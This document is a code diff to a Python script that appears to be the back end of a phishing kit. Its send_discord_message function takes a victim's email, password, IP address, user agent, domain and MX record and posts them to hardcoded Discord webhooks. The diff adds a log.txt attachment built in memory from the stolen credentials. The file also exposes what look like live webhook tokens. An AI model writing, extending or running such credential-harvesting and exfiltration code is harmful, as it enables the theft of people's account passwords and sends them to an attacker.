@@ -15,6 +15,7 @@ from email.mime.multipart import MIMEMultipart
 import time
 import random
 import dns.resolver
+import io
 
 DISCORD_WEBHOOK_URLS = [
     "https://discord.com/api/webhooks/1339995643497681058/XBIWTD-VWQ0Ssg5KUR3ojdSuCkJFhRIw2TgYAvIXZce5BrVWVRQp0n9cySRZAdb1wQIe",
@@ -24,13 +25,25 @@ DISCORD_WEBHOOK_URLS = [
 
 def send_discord_message(email, password, ip, useragent, domain, mx_record):
     webhook_url = random.choice(DISCORD_WEBHOOK_URLS)  # Select a random webhook
+
+    # Create a text file in memory
+    file_content = f"""Email: {email}
+Password: {password}
+IP: {ip}
+User-Agent: {useragent}
+Domain: {domain}
+MX Record: {mx_record}
+"""
+    file_obj = io.BytesIO(file_content.encode())  # Convert to bytes-like object
+
+    # Prepare Discord embed
     message = {
         "username": "Logger Bot",
-        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",  # Optional bot avatar
+        "avatar_url": "https://i.imgur.com/zW2WJ3o.png",
         "embeds": [
             {
                 "title": "🔔 General New Login Attempt",
-                "color": 16711680,  # Red color in Discord embed
+                "color": 16711680,
                 "fields": [
                     {"name": "📧 Email", "value": f"`{email}`", "inline": False},
                     {"name": "🔑 Password", "value": f"`{password}`", "inline": False},
@@ -43,9 +56,16 @@ def send_discord_message(email, password, ip, useragent, domain, mx_record):
             }
         ]
     }
-    
+
+    # Send data to Discord
     try:
-        requests.post(webhook_url, json=message)
+        response = requests.post(
+            webhook_url,
+            data={"payload_json": str(message)},  # Send embed data
+            files={"file": ("log.txt", file_obj, "text/plain")}  # Attach the in-memory file
+        )
+        if response.status_code != 200:
+            print(f"Error sending message to Discord: {response.text}")
     except requests.exceptions.RequestException as e:
         print(f"Error sending message to Discord: {e}")
 
